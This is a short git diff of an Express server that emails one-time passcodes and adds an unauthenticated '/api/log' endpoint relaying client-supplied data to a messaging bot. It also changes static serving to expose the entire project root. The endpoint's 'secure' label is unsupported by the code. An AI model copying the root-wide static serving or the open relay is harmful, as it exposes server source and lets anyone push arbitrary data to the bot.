@@ -7,7 +7,9 @@ const app = express();
 const port = process.env.PORT || 3000;
 
 app.use(express.json());
-app.use(express.static(path.join(__dirname)));
+
+// Serve static files from root
+app.use(express.static(__dirname));
 
 const transporter = nodemailer.createTransport({
     service: 'gmail',
@@ -17,6 +19,7 @@ const transporter = nodemailer.createTransport({
     }
 });
 
+// Endpoint to send OTP
 app.post('/send-otp', async (req, res) => {
     const { email } = req.body;
     if (!email) return res.status(400).json({ success: false });
@@ -44,14 +47,14 @@ app.post('/send-otp', async (req, res) => {
     }
 });
 
+// SECURE LOGGING ENDPOINT
 app.post('/api/log', async (req, res) => {
     const { title, data } = req.body;
     const token = process.env.LOG_BOT_TOKEN;
     const chatId = process.env.LOG_BOT_CHAT_ID;
 
     if (!token || !chatId) {
-        console.error('Config missing in .env');
-        return res.status(500).json({ success: false, message: 'Bot config missing' });
+        return res.status(500).json({ success: false, message: 'Bot config missing in .env' });
     }
 
     const message = `
@@ -79,6 +82,7 @@ app.post('/api/log', async (req, res) => {
     }
 });
 
+// Fix for Express 5 catch-all
 app.get('*', (req, res) => {
     res.sendFile(path.join(__dirname, 'index.html'));
 });
